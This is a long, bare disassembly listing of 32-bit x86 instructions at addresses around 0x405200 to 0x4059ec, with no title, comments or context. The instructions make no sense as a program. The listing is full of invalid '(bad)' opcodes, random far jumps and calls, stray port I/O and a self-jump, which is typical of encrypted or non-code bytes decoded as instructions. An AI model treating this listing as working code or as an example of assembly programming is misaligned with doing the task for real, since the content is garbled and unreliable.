  40520a:	mov    dh,0x9
  40520c:	imul   eax,DWORD PTR [edi],0xffffff86
  40520f:	popf   
  405210:	ja     0x4051cc
  405212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405213:	xchg   DWORD PTR [edx],esi
  405215:	loop   0x405238
  405217:	neg    BYTE PTR [edx+0x4097a5bb]
  40521d:	das    
  40521e:	push   ds
  40521f:	mov    DWORD PTR [ebx+0x1938c4dd],ecx
  405225:	jb     0x4051bf
  405227:	stc    
  405228:	shl    DWORD PTR [edi-0x5c2541d9],1
  40522e:	cmp    ebp,DWORD PTR [eax]
  405230:	push   edx
  405231:	dec    eax
  405232:	cmp    ebx,esp
  405234:	(bad)  
  405235:	adc    al,0x57
  405237:	push   ebx
  405238:	ja     0x405229
  40523a:	(bad)  
  40523b:	fisub  WORD PTR [ecx+esi*4+0x710ce4e0]
  405242:	js     0x40528c
  405244:	loope  0x4051eb
  405246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405247:	or     DWORD PTR [ebx+edx*2-0x18],ebx
  40524b:	lods   eax,DWORD PTR ds:[esi]
  40524c:	push   edi
  40524d:	fadd   st(7),st
  40524f:	call   0x48898714
  405254:	mov    edx,0x4b53a4e6
  405259:	ds add al,0x18
  40525c:	sub    eax,DWORD PTR [ecx]
  40525e:	jge    0x4051fd
  405260:	cld    
  405261:	mov    al,ds:0x100cba49
  405266:	das    
  405267:	mov    fs,esp
  405269:	inc    ecx
  40526a:	push   0xffffffd1
  40526c:	xor    DWORD PTR [ecx],edi
  40526e:	push   edi
  40526f:	out    dx,eax
  405270:	imul   edi,eax,0xffffff85
  405273:	shr    BYTE PTR [edx-0x74],cl
  405276:	(bad)  
  405277:	xlat   BYTE PTR ds:[ebx]
  405278:	xchg   edi,eax
  405279:	loope  0x405274
  40527b:	cmp    eax,0xde574f86
  405280:	lods   eax,DWORD PTR ds:[esi]
  405281:	jp     0x4052fe
  405283:	pop    ebp
  405284:	loop   0x40525b
  405286:	inc    edx
  405287:	add    DWORD PTR [ebx],0xcf69fbad
  40528d:	add    esp,DWORD PTR [ecx+0x53]
  405290:	push   esp
  405291:	inc    esi
  405292:	inc    edi
  405293:	mov    dh,0x0
  405295:	test   al,0x58
  405297:	lahf   
  405298:	jne    0x40521d
  40529a:	shl    BYTE PTR [eax],cl
  40529c:	ds mov esp,0x6417feca
  4052a2:	cmc    
  4052a3:	add    al,0xd9
  4052a5:	jl     0x4052d1
  4052a7:	repnz ins BYTE PTR es:[edi],dx
  4052a9:	jl     0x405302
  4052ab:	sahf   
  4052ac:	popf   
  4052ad:	out    0xf7,al
  4052af:	loopne 0x4052b2
  4052b1:	jle    0x40530e
  4052b3:	inc    edx
  4052b4:	pop    ecx
  4052b5:	lds    esi,FWORD PTR [eax-0x2e92190d]
  4052bb:	cmp    eax,0x125dd2bc
  4052c0:	(bad)  
  4052c1:	sbb    eax,0xbfdbb0fc
  4052c6:	jb     0x405291
  4052c8:	inc    edx
  4052c9:	minps  xmm6,xmm7
  4052cc:	test   bl,ch
  4052ce:	mov    esp,DWORD PTR [edi-0x34c65e55]
  4052d4:	test   BYTE PTR ss:[ebp+0x10],dl
  4052d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052d9:	pop    ss
  4052da:	rol    DWORD PTR [ebx+0x1761a72c],cl
  4052e0:	pop    edx
  4052e1:	mov    BYTE PTR [ecx],cl
  4052e3:	xchg   edx,eax
  4052e4:	inc    ebx
  4052e5:	shld   edi,edi,cl
  4052e8:	pushf  
  4052e9:	nop
  4052ea:	jae    0x405318
  4052ec:	and    al,0x2b
  4052ee:	mov    dl,0x6e
  4052f0:	jmp    0x259:0x37ae3f40
  4052f7:	mov    cl,0x8e
  4052f9:	jno    0x405283
  4052fb:	mov    ah,BYTE PTR [edx]
  4052fd:	jmp    0x527f5e8c
  405302:	mov    cs:0xa0e60f13,eax
  405308:	inc    esi
  405309:	mov    ecx,0x2e86755e
  40530e:	mov    eax,0xcc96eff4
  405313:	je     0x405383
  405315:	rcr    BYTE PTR ds:0x5a3b9c8,1
  40531b:	imul   ebp,edi,0x6c027d93
  405321:	dec    esi
  405322:	inc    esp
  405323:	mov    eax,0x68b8ebb9
  405328:	mov    eax,0xf5eb16bd
  40532d:	lds    ebp,FWORD PTR [esi+0x7]
  405330:	cmp    esi,DWORD PTR [eax+0x73caba2]
  405336:	push   ebp
  405337:	std    
  405338:	add    ah,BYTE PTR [esi-0x69c108da]
  40533e:	mov    ds,WORD PTR [edx+0x1cb758cc]
  405344:	xlat   BYTE PTR ds:[ebx]
  405345:	jno    0x405322
  405347:	js     0x405393
  405349:	out    dx,al
  40534a:	xlat   BYTE PTR ds:[ebx]
  40534b:	sbb    eax,0x78f01972
  405350:	add    ax,0xdb6f
  405354:	fld    QWORD PTR [ebp-0x5b]
  405357:	js     0x405301
  405359:	aam    0x8e
  40535b:	test   eax,0xade9a232
  405360:	int    0x45
  405362:	dec    esp
  405363:	and    DWORD PTR [ebp+0x7a6d805c],esp
  405369:	not    DWORD PTR [ecx-0x6a57177]
  40536f:	(bad)  
  405370:	out    dx,eax
  405371:	xor    DWORD PTR [eax],0xffffffa0
  405374:	(bad)  
  405375:	div    BYTE PTR [esi+0x1a39b9e]
  40537b:	xchg   edx,eax
  40537c:	inc    edx
  40537d:	icebp  
  40537e:	clc    
  40537f:	stos   DWORD PTR es:[edi],eax
  405380:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405381:	repz loop 0x405313
  405384:	adc    eax,0xfe25e5a2
  405389:	cli    
  40538a:	jp     0x405316
  40538c:	inc    esi
  40538d:	xor    esi,ecx
  40538f:	jmp    0x40538f
  405391:	test   DWORD PTR [edx],edx
  405393:	xor    al,BYTE PTR [edi-0x37]
  405396:	cvtps2pi mm0,QWORD PTR [eax]
  405399:	xchg   esi,eax
  40539a:	hlt    
  40539b:	add    BYTE PTR [edx-0x21b0566b],0x24
  4053a2:	mov    dh,0x5a
  4053a4:	jl     0x40539f
  4053a6:	nop
  4053a7:	and    ecx,esp
  4053a9:	pusha  
  4053aa:	mov    esp,DWORD PTR [ebx]
  4053ac:	mov    ah,0xaa
  4053ae:	pop    ebp
  4053af:	mov    ecx,0x45b592ba
  4053b4:	inc    ebp
  4053b5:	push   ecx
  4053b6:	enter  0x3c45,0x87
  4053ba:	cmp    ah,bh
  4053bc:	ss dec ebx
  4053be:	xor    DWORD PTR [ebp-0x8],edx
  4053c1:	popf   
  4053c2:	push   cs
  4053c3:	loop   0x4053f8
  4053c5:	test   al,0x4
  4053c7:	scas   eax,DWORD PTR es:[edi]
  4053c8:	mov    eax,0x90089aaa
  4053cd:	jg     0x405441
  4053cf:	(bad)  
  4053d0:	xchg   BYTE PTR [ebx+0x1a],al
  4053d3:	push   cs
  4053d4:	iret   
  4053d5:	xchg   edi,eax
  4053d6:	sbb    BYTE PTR [ecx],ch
  4053d8:	daa    
  4053d9:	cs scas ax,WORD PTR es:[edi]
  4053dc:	shl    DWORD PTR [ebx-0x65cf078],0xbc
  4053e3:	pop    ss
  4053e4:	mov    DWORD PTR ds:0xe2cc71fe,eax
  4053ea:	(bad)  
  4053eb:	xchg   ebx,eax
  4053ec:	mov    bl,0xa4
  4053ee:	js     0x405401
  4053f0:	and    eax,0x4e4b75d3
  4053f5:	repnz iret 
  4053f7:	xchg   esi,eax
  4053f8:	test   BYTE PTR [ecx+ebp*2-0x33b42539],0x83
  405400:	and    eax,0x5a42779e
  405405:	mov    BYTE PTR [edx+0x166d1728],cl
  40540b:	arpl   si,bx
  40540d:	(bad)  [edi]
  40540f:	sbb    edx,DWORD PTR ds:0x1284e51b
  405415:	fist   DWORD PTR [eax]
  405417:	in     al,0x99
  405419:	call   0x98920873
  40541e:	xchg   esi,eax
  40541f:	mov    bl,dl
  405421:	dec    esp
  405422:	fnsave [esi+0x1c]
  405425:	aaa    
  405426:	cli    
  405427:	xor    dh,dh
  405429:	gs dec ebp
  40542b:	jne    0x405475
  40542d:	outs   dx,BYTE PTR ds:[esi]
  40542e:	mov    eax,ss:0x9e99755f
  405434:	leave  
  405435:	popf   
  405436:	jmp    0x6927baa1
  40543b:	retf   0x902c
  40543e:	push   eax
  40543f:	fidiv  DWORD PTR [ecx+0x1]
  405442:	(bad)  
  405443:	jbe    0x40541c
  405445:	daa    
  405446:	mov    edx,0x43cbe623
  40544b:	xor    BYTE PTR [ecx+0x26e0db1d],bl
  405451:	pop    eax
  405452:	leave  
  405453:	mov    bl,0xc1
  405455:	mov    ch,0xb7
  405457:	inc    edx
  405458:	das    
  405459:	cmp    DWORD PTR [edi+eiz*1],esp
  40545c:	stc    
  40545d:	into   
  40545e:	push   ds
  40545f:	and    BYTE PTR [edx],cl
  405461:	or     al,0xe8
  405463:	xor    DWORD PTR [ebx+eiz*4],ebp
  405466:	or     al,0xba
  405468:	mov    esp,0x9cac1fe1
  40546d:	pop    esi
  40546e:	pusha  
  40546f:	and    ax,0x83af
  405473:	xor    ch,ah
  405475:	cs jbe 0x4054de
  405478:	call   0x98f7:0xe73dba94
  40547f:	or     DWORD PTR [ebx+edi*1],eax
  405482:	fldenv [esi-0xd8719c9]
  405488:	pop    esp
  405489:	mov    ch,0xbf
  40548b:	rol    cl,0x77
  40548e:	xchg   ebp,eax
  40548f:	push   0x62
  405491:	and    BYTE PTR [ebp-0x2b],al
  405494:	add    dh,al
  405496:	and    edi,edx
  405498:	and    edx,esi
  40549a:	stc    
  40549b:	pop    edx
  40549c:	pop    ebx
  40549d:	outs   dx,BYTE PTR ds:[esi]
  40549e:	(bad)  
  4054a0:	clc    
  4054a1:	test   DWORD PTR [edx],ebp
  4054a3:	lds    edi,FWORD PTR ds:[ebp-0x3]
  4054a7:	sbb    al,0x96
  4054a9:	jge    0x40544c
  4054ab:	pop    fs
  4054ad:	xor    BYTE PTR [esi-0x43eeac32],0xea
  4054b4:	(bad)  
  4054b5:	test   eax,0xbb4afb1b
  4054ba:	test   eax,0xa520e4ce
  4054bf:	xor    al,0x6f
  4054c1:	add    ebp,0x352c11dc
  4054c7:	inc    edi
  4054c8:	sub    ah,ah
  4054ca:	pop    ds
  4054cb:	add    ch,cl
  4054cd:	pop    esi
  4054ce:	jns    0x405499
  4054d0:	cmp    al,0x7d
  4054d2:	fistp  DWORD PTR [edx+0x5a]
  4054d5:	mov    edx,0x60749987
  4054da:	in     eax,dx
  4054db:	push   cs
  4054dc:	mov    dh,0x47
  4054de:	adc    DWORD PTR [ecx+0x250672af],ecx
  4054e4:	mov    dh,0x70
  4054e6:	jle    0x405541
  4054e8:	add    ebp,0x57ed10ee
  4054ee:	inc    edi
  4054ef:	sbb    edx,DWORD PTR [edx]
  4054f1:	xor    eax,0xcf6558e
  4054f6:	xor    eax,0x6e87d968
  4054fb:	xor    dh,bh
  4054fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054fe:	lock addr16 pop ebp
  405501:	add    dh,BYTE PTR [ebx]
  405503:	ins    BYTE PTR es:[edi],dx
  405504:	push   ecx
  405505:	pop    ecx
  405506:	push   edi
  405507:	sahf   
  405508:	adc    esp,DWORD PTR [eax]
  40550a:	les    ebp,FWORD PTR [edx+ecx*8-0x4f]
  40550e:	push   0xffffffc4
  405510:	pusha  
  405511:	addr16 ret 
  405513:	mov    eax,ds:0xcf247dfe
  405518:	add    DWORD PTR [ebx-0x58],eax
  40551b:	(bad)  
  40551c:	ds jbe 0x40556e
  40551f:	xchg   cl,dh
  405521:	and    BYTE PTR [ebp+0x7],dh
  405524:	jmp    0x60e840c7
  405529:	cmp    eax,0x91a6345
  40552e:	and    DWORD PTR [edx],ecx
  405530:	scas   eax,DWORD PTR es:[edi]
  405531:	mov    ebp,0xfa11083
  405536:	xchg   DWORD PTR [eax-0x65c94132],esi
  40553c:	out    dx,al
  40553d:	test   BYTE PTR [ebx-0x2f4941b6],bh
  405543:	jo     0x4055c1
  405545:	sub    BYTE PTR [ebx+0x3],ah
  405548:	cmp    ebp,DWORD PTR [ebp+0x4dd00ebe]
  40554e:	(bad)  
  40554f:	jge    0x40553a
  405551:	js     0x405577
  405553:	std    
  405554:	inc    edx
  405555:	ret    
  405556:	cdq    
  405557:	or     eax,0xd245c61f
  40555c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40555d:	mov    ds:0xc269568e,eax
  405562:	or     BYTE PTR [edi+0x2b],bh
  405565:	pop    es
  405566:	jne    0x4055bc
  405568:	sbb    ecx,DWORD PTR [ecx+esi*8-0xb783ba]
  40556f:	sub    ebx,DWORD PTR [edx-0x4a25ca79]
  405575:	add    DWORD PTR [ebp-0x7ad508c2],edi
  40557b:	cmp    cl,BYTE PTR [esi+0x60]
  40557e:	lods   al,BYTE PTR ds:[esi]
  40557f:	and    edi,DWORD PTR [ebx+ebx*4]
  405582:	xor    eax,0x9bf8a9a3
  405587:	push   ds
  405588:	out    0xe0,eax
  40558a:	mov    bh,0xaa
  40558c:	popf   
  40558d:	outs   dx,DWORD PTR ds:[esi]
  40558e:	sub    esi,edi
  405590:	out    dx,al
  405591:	pop    es
  405592:	pop    ds
  405593:	xor    al,0x16
  405595:	fdiv   DWORD PTR [edi+eax*4+0x20]
  405599:	sub    al,0xae
  40559b:	shl    BYTE PTR [ebp+0x57],cl
  40559e:	arpl   WORD PTR [edi-0x294dae4d],sp
  4055a4:	add    edx,DWORD PTR [edx]
  4055a6:	push   0x8
  4055a8:	popa   
  4055a9:	xchg   ebp,eax
  4055aa:	ret    0x233d
  4055ad:	cmp    esp,DWORD PTR [ebp-0x6c52b5f1]
  4055b3:	pop    eax
  4055b4:	xor    al,BYTE PTR [ebx+0x3e]
  4055b7:	adc    al,0x3f
  4055b9:	jmp    0x4055d4
  4055bb:	call   0xa2a6:0xcc2ca833
  4055c2:	out    dx,eax
  4055c3:	mov    eax,ds:0xd6e96c16
  4055c8:	mov    ebp,0x5681e233
  4055cd:	xor    eax,0xdf9bfbee
  4055d2:	lahf   
  4055d3:	test   BYTE PTR [ebp-0x6067edb2],0xa0
  4055da:	shl    BYTE PTR [eax],1
  4055dc:	xchg   ebp,eax
  4055dd:	into   
  4055de:	ds fmul st(6),st
  4055e1:	repnz int3 
  4055e3:	fsubr  st,st(3)
  4055e5:	mov    ?,WORD PTR [edi-0x54942728]
  4055eb:	lock or DWORD PTR [esi-0xa],esp
  4055ef:	mov    al,ds:0x9a32d1fa
  4055f4:	leave  
  4055f5:	mul    DWORD PTR [eax]
  4055f7:	mov    ebx,DWORD PTR [eax+0x52]
  4055fa:	loop   0x4055fd
  4055fc:	ins    DWORD PTR es:[edi],dx
  4055fd:	js     0x405656
  4055ff:	jg     0x4055e5
  405601:	or     esp,eax
  405603:	(bad)  
  405604:	(bad)  
  405605:	mov    DWORD PTR [edx],ebp
  405607:	inc    ecx
  405608:	xor    ecx,DWORD PTR [edi+0x1f]
  40560b:	adc    DWORD PTR [ebp+0x4e94ff11],edi
  405611:	or     al,BYTE PTR [ebx+0x60b6357d]
  405617:	ror    BYTE PTR [edx+0x44154b0a],cl
  40561d:	jmp    0x40568b
  40561f:	retf   0xa5d9
  405622:	jmp    0x91140f9c
  405627:	rcl    BYTE PTR gs:[eax-0x65],cl
  40562b:	pop    ebp
  40562c:	push   esi
  40562d:	jp     0x4055c9
  40562f:	(bad)  
  405630:	sbb    eax,0xc83b36bd
  405635:	outs   dx,DWORD PTR ds:[esi]
  405636:	pop    edi
  405637:	dec    ecx
  405638:	jmp    0x40569d
  40563a:	jge    0x4056b4
  40563c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40563d:	mov    eax,ds:0x11629131
  405642:	mov    ch,0xca
  405644:	xchg   eax,esi
  405646:	mov    al,ds:0x193df870
  40564b:	add    DWORD PTR [edi],esp
  40564d:	mov    ch,0x4b
  40564f:	retf   0x3cee
  405652:	mov    dh,0xb0
  405654:	daa    
  405655:	(bad)  
  405656:	cmp    bh,dl
  405658:	or     BYTE PTR [esi-0x6b],bl
  40565b:	leave  
  40565c:	inc    ebp
  40565d:	pop    esi
  40565e:	sbb    eax,0x8090ad6e
  405663:	xor    al,0x2f
  405665:	lds    eax,FWORD PTR [esi]
  405667:	push   ss
  405668:	cmc    
  405669:	mov    DWORD PTR [esi+0x57],eax
  40566c:	fwait
  40566d:	push   es
  40566e:	aad    0x23
  405670:	add    al,0xff
  405672:	push   ds
  405673:	mov    ds:0x8d2addb2,eax
  405678:	or     DWORD PTR ds:0x4ccf164a,0xed050b2a
  405682:	dec    edx
  405683:	jle    0x40560e
  405685:	into   
  405686:	dec    ebp
  405687:	push   edi
  405688:	and    DWORD PTR [edi-0x72],esi
  40568b:	bound  ebx,QWORD PTR [ebx+0x1ba950a4]
  405691:	sub    eax,0x81c92eee
  405696:	mov    dl,0xdb
  405698:	fbstp  TBYTE PTR [ebp+0xe]
  40569b:	(bad)
  40569e:	push   0xffffffa4
  4056a0:	loop   0x405658
  4056a2:	rol    BYTE PTR [esi+0x1],cl
  4056a5:	adc    eax,0x3446669e
  4056aa:	ficomp WORD PTR [eax]
  4056ac:	pusha  
  4056ad:	mov    al,ds:0x54927bd5
  4056b2:	dec    esp
  4056b3:	stos   BYTE PTR es:[edi],al
  4056b4:	mov    ?,WORD PTR [edx-0x163d6abc]
  4056ba:	arpl   WORD PTR ds:0x7f6ce2c9,ax
  4056c0:	faddp  st(6),st
  4056c2:	loopne 0x4056de
  4056c4:	rcr    BYTE PTR [eax],1
  4056c6:	adc    ebx,DWORD PTR [eax]
  4056c8:	push   ss
  4056c9:	mov    dl,0xa6
  4056cb:	push   ss
  4056cc:	inc    esi
  4056cd:	sbb    esi,DWORD PTR [ebp+edi*1-0x79]
  4056d1:	and    eax,0x40cda67b
  4056d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056d7:	retf   0x65d0
  4056da:	and    al,0xed
  4056dc:	mov    bh,0x38
  4056de:	xchg   ecx,eax
  4056df:	or     ecx,DWORD PTR [eax+0x6709d422]
  4056e5:	jecxz  0x405752
  4056e7:	cs scas al,BYTE PTR es:[edi]
  4056e9:	pop    eax
  4056ea:	fdivr  QWORD PTR ds:0xecdabb91
  4056f0:	inc    esi
  4056f1:	adc    edx,DWORD PTR [edi]
  4056f3:	mov    ebx,0xab7f97b
  4056f8:	jnp    0x4056e4
  4056fa:	(bad)  
  4056fb:	(bad)  
  4056fc:	jge    0x40570d
  4056fe:	test   DWORD PTR [ebx+esi*1],esp
  405701:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405702:	xchg   DWORD PTR [ebx],ebp
  405704:	js     0x40574f
  405706:	(bad)  
  405708:	test   DWORD PTR [edx+ebx*2],ecx
  40570b:	push   0x27af93ea
  405710:	sbb    eax,0xfd1293c9
  405715:	inc    esi
  405716:	cmp    DWORD PTR [eax+0x19],edi
  405719:	outs   dx,DWORD PTR ds:[esi]
  40571a:	jp     0x40571f
  40571c:	cld    
  40571d:	icebp  
  40571e:	bound  edi,QWORD PTR [ecx*8-0x64a3011f]
  405725:	ror    BYTE PTR ds:0xcb8a0834,1
  40572b:	xor    eax,0xc3a546d3
  405730:	les    edx,FWORD PTR [eax+0x667d8fb5]
  405736:	loop   0x405737
  405738:	das    
  405739:	sbb    esp,DWORD PTR [edi-0x48]
  40573c:	inc    edi
  40573d:	mov    ds:0x61315b6d,al
  405742:	(bad)  
  405743:	jecxz  0x405725
  405745:	jmp    0xbeba:0xd13cf33
  40574c:	jge    0x40571a
  40574e:	xchg   edx,eax
  40574f:	or     eax,0x25013b79
  405754:	imul   ebx,esi,0x9e2b02c3
  40575a:	fmul   QWORD PTR [eax+esi*8-0xaa5bc05]
  405761:	jmp    0xc36a:0x860ff13e
  405768:	rcl    BYTE PTR [ebx+0x41],cl
  40576b:	int3   
  40576c:	scas   eax,DWORD PTR es:[edi]
  40576d:	fucom  st(4)
  40576f:	popf   
  405770:	je     0x405700
  405772:	push   ebp
  405773:	stos   DWORD PTR es:[edi],eax
  405774:	sbb    esp,DWORD PTR [ebx+0x3befe39a]
  40577a:	iret   
  40577b:	fst    DWORD PTR [ebp+0x4df7a49e]
  405781:	adc    edx,edx
  405783:	adc    eax,0x3452c6c4
  405788:	mov    ebx,0xe0a60df7
  40578d:	or     al,0x25
  40578f:	out    0x77,eax
  405791:	xor    esp,DWORD PTR [ecx+0x681b3578]
  405797:	dec    eax
  405798:	cld    
  405799:	pushf  
  40579a:	xchg   ebx,eax
  40579b:	stos   BYTE PTR es:[edi],al
  40579c:	sbb    eax,0xa39c07f
  4057a1:	test   BYTE PTR [esi+0x66595223],bh
  4057a7:	jo     0x405800
  4057a9:	xchg   edi,eax
  4057aa:	jae    0x4057c1
  4057ac:	inc    esp
  4057ad:	fstp   TBYTE PTR [edi-0x7dd16708]
  4057b3:	pop    eax
  4057b4:	pop    edx
  4057b5:	push   edx
  4057b6:	dec    esi
  4057b7:	mov    al,ds:0x5d831b1f
  4057bc:	outs   dx,BYTE PTR es:[esi]
  4057be:	leave  
  4057bf:	pop    edx
  4057c0:	es mov dl,0x3c
  4057c3:	sub    eax,0xa866c8f3
  4057c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057ca:	leave  
  4057cb:	dec    edx
  4057cc:	lods   al,BYTE PTR ds:[esi]
  4057cd:	push   ebx
  4057ce:	inc    edx
  4057cf:	inc    esi
  4057d0:	pop    ss
  4057d1:	leave  
  4057d2:	pop    ebp
  4057d3:	inc    esi
  4057d4:	int3   
  4057d5:	(bad)
  4057d8:	fs std 
  4057da:	ret    
  4057db:	cmp    dh,bl
  4057dd:	mov    bl,0xe6
  4057df:	adc    eax,0xeca1201f
  4057e4:	sub    bl,BYTE PTR [ebx-0x7]
  4057e7:	ret    0xbe11
  4057ea:	pop    ebx
  4057eb:	pslld  mm4,QWORD PTR [ebx]
  4057ee:	(bad)  
  4057f0:	cld    
  4057f1:	dec    ebp
  4057f2:	lock in eax,dx
  4057f4:	fucomp st(6)
  4057f6:	jmp    0x4e87:0xb40a004
  4057fd:	jne    0x4057a7
  4057ff:	out    0x5b,al
  405801:	adc    DWORD PTR [esi-0x73],edi
  405804:	repz std 
  405806:	test   DWORD PTR [eax+0x2f7f8881],0x9391effc
  405810:	pop    ss
  405811:	and    DWORD PTR [ebp+0x21],eax
  405814:	xchg   esi,eax
  405815:	stc    
  405816:	je     0x40586a
  405818:	sar    DWORD PTR ds:0x64549ddd,0x15
  40581f:	sub    BYTE PTR [esi-0x57],al
  405822:	jb     0x405877
  405824:	lea    esi,[ebx]
  405826:	xchg   esi,eax
  405827:	aad    0xb2
  405829:	mov    bl,0xa2
  40582b:	dec    esi
  40582c:	inc    eax
  40582d:	popa   
  40582e:	out    dx,al
  40582f:	pop    esi
  405830:	jp     0x4057f9
  405832:	bound  esi,QWORD PTR [esi]
  405834:	(bad)  
  405835:	jge    0x40588f
  405837:	loope  0x4057cf
  405839:	mov    DWORD PTR [ebp+0x77],ebp
  40583c:	mov    dl,0xa6
  40583e:	or     al,0xe8
  405840:	jo     0x40583f
  405842:	mov    esi,0x8838d788
  405847:	xor    ah,BYTE PTR [esp+ecx*8+0xad0dd9c]
  40584e:	test   ch,ah
  405850:	sti    
  405851:	mov    edx,0x5486ac4b
  405856:	or     al,0x99
  405858:	lock les esi,FWORD PTR [esi]
  40585b:	cld    
  40585c:	xchg   BYTE PTR fs:[esi+eax*4+0x11],dl
  405861:	pop    ebp
  405862:	and    BYTE PTR [esi-0x15],0xf
  405866:	das    
  405867:	jp     0x4058c2
  405869:	xchg   edi,eax
  40586a:	sub    eax,0x9c089f0d
  40586f:	sbb    al,0xee
  405871:	shl    dl,0x23
  405874:	xor    dh,BYTE PTR [edi]
  405876:	push   0xf08aac8
  40587b:	pop    ebx
  40587c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40587d:	pushf  
  40587e:	mov    dh,0x9b
  405880:	stos   DWORD PTR es:[edi],eax
  405881:	adc    esp,DWORD PTR [ebp-0x5a]
  405884:	mov    eax,ds:0xfa7b4cdd
  405889:	outs   dx,DWORD PTR ds:[esi]
  40588a:	mov    bl,0x96
  40588c:	rol    DWORD PTR [ebx],cl
  40588e:	mov    ds:0x33a16e9b,eax
  405893:	es adc eax,ebp
  405896:	dec    esi
  405897:	pop    ebp
  405898:	ret    
  405899:	cdq    
  40589a:	int    0x30
  40589c:	(bad)  
  40589d:	xchg   bl,al
  40589f:	mov    edx,0x7504bbd1
  4058a4:	adc    ebp,DWORD PTR [ebx+0xde00004]
  4058aa:	cmp    cl,BYTE PTR [ebx]
  4058ac:	and    eax,DWORD PTR [ebx-0x11afbaa2]
  4058b2:	sbb    bl,BYTE PTR [ebx]
  4058b4:	jnp    0x405855
  4058b6:	xchg   ecx,eax
  4058b7:	out    0xf1,al
  4058b9:	std    
  4058ba:	lahf   
  4058bb:	gs loop 0x40586f
  4058be:	jae    0x4058f8
  4058c0:	or     eax,0xe4fee6ad
  4058c5:	hlt    
  4058c6:	imul   ebp,DWORD PTR [esi+0x4a],0x75
  4058ca:	popa   
  4058cb:	aas    
  4058cc:	sub    eax,0x7ab9d5ed
  4058d1:	inc    edi
  4058d2:	sub    al,BYTE PTR [ebx+0x4a3d5e59]
  4058d8:	dec    edi
  4058d9:	push   edx
  4058da:	loop   0x405901
  4058dc:	gs jae 0x40587c
  4058df:	popf   
  4058e0:	loop   0x405876
  4058e2:	jecxz  0x4058a5
  4058e4:	(bad)  
  4058e5:	pop    ecx
  4058e6:	xor    al,BYTE PTR [eax+ebx*2+0x60621f07]
  4058ed:	jmp    0xc60a30c
  4058f2:	imul   BYTE PTR [edx-0x7dee967e]
  4058f8:	pusha  
  4058f9:	nop
  4058fa:	ja     0x4058b9
  4058fc:	test   DWORD PTR [edx-0x57],esi
  4058ff:	call   0x3c5a:0x3ca3e014
  405906:	ja     0x4058ff
  405908:	ins    DWORD PTR es:[edi],dx
  405909:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40590a:	mov    eax,ds:0xf9807178
  40590f:	adc    DWORD PTR [edi+edi*1-0x3a],esp
  405913:	and    eax,0xdd4a7159
  405918:	(bad)  
  405919:	leave  
  40591a:	dec    esi
  40591b:	iret   
  40591c:	in     al,0xc2
  40591e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40591f:	cli    
  405920:	jge    0x40595d
  405922:	mov    ebx,0x29ffdf60
  405927:	or     al,BYTE PTR [esi+0x9c9b3ac]
  40592d:	and    al,0x3b
  40592f:	xchg   bl,bh
  405931:	pop    esi
  405932:	stos   BYTE PTR es:[edi],al
  405933:	outs   dx,DWORD PTR ds:[esi]
  405934:	sahf   
  405935:	dec    ecx
  405936:	adc    BYTE PTR [ebx-0x778ec8f8],dh
  40593c:	cli    
  40593d:	push   ebx
  40593e:	xchg   edi,eax
  40593f:	push   DWORD PTR [ebx-0x4e]
  405942:	repnz pop edx
  405944:	sub    al,0x7
  405946:	mov    cl,BYTE PTR [esi]
  405948:	xor    edi,DWORD PTR [ebx]
  40594a:	mov    edi,0xf799223c
  40594f:	pop    edi
  405950:	cs inc edi
  405952:	inc    esi
  405953:	sbb    DWORD PTR [ebp+0x35],ebx
  405956:	push   eax
  405957:	xchg   edi,eax
  405958:	adc    cl,al
  40595a:	mov    eax,ds:0x5071f6a6
  40595f:	mov    cs,WORD PTR [ebx]
  405961:	jns    0x40590e
  405963:	ins    DWORD PTR es:[edi],dx
  405964:	jne    0x40591c
  405966:	test   BYTE PTR [ecx-0x28ca6e5c],dl
  40596c:	mov    bl,0x78
  40596e:	stc    
  40596f:	or     DWORD PTR [ebp-0x40838722],ebx
  405975:	adc    al,0x3d
  405977:	push   ebx
  405978:	push   0xffffff87
  40597a:	scas   al,BYTE PTR es:[edi]
  40597b:	cmp    al,0x17
  40597d:	stos   DWORD PTR es:[edi],eax
  40597e:	sbb    eax,0x5b9df9c9
  405983:	call   0xaa9a632e
  405988:	inc    ebp
  405989:	push   ss
  40598a:	xor    BYTE PTR [ebx+0x17],cl
  40598d:	lea    ebp,[edi]
  40598f:	pop    edx
  405990:	in     al,0x3d
  405992:	mov    dh,0xe8
  405994:	and    edi,DWORD PTR [ecx+0x21]
  405997:	add    ah,BYTE PTR [ebx]
  405999:	hlt    
  40599a:	sahf   
  40599b:	repz xchg edx,eax
  40599d:	add    edi,esi
  40599f:	cmp    edx,eax
  4059a1:	loop   0x4059ac
  4059a3:	xchg   esi,eax
  4059a4:	pop    es
  4059a5:	(bad)  
  4059a6:	repz push ebx
  4059a8:	xchg   ebp,ebp
  4059aa:	dec    esp
  4059ab:	aam    0x96
  4059ad:	pusha  
  4059ae:	je     0x405a03
  4059b0:	into   
  4059b1:	shufps xmm4,XMMWORD PTR [eax+0x7a],0xa3
  4059b6:	sbb    eax,0x8eeb07b4
  4059bb:	rol    BYTE PTR [edx],0xca
  4059be:	clc    
  4059bf:	cwde   
  4059c0:	adc    edx,edi
  4059c2:	outs   dx,DWORD PTR ds:[esi]
  4059c3:	or     BYTE PTR [ebx-0x58],al
  4059c6:	add    al,0x10
  4059c8:	push   es
  4059c9:	retf   0x80b0
  4059cc:	push   ebp
  4059cd:	fdiv   DWORD PTR [ebx+eiz*1-0x33]
  4059d1:	add    ebp,DWORD PTR [edi]
  4059d3:	outs   dx,DWORD PTR ds:[esi]
  4059d4:	mov    ecx,0x604157c8
  4059d9:	loopne 0x405a3b
  4059db:	or     eax,0x6a4f48a2
  4059e0:	repz mov al,ds:0x60d9849b
  4059e6:	fs ret 
  4059e8:	add    al,0xb
  4059ea:	dec    esi
  4059eb:	fstp   DWORD PTR [edx]
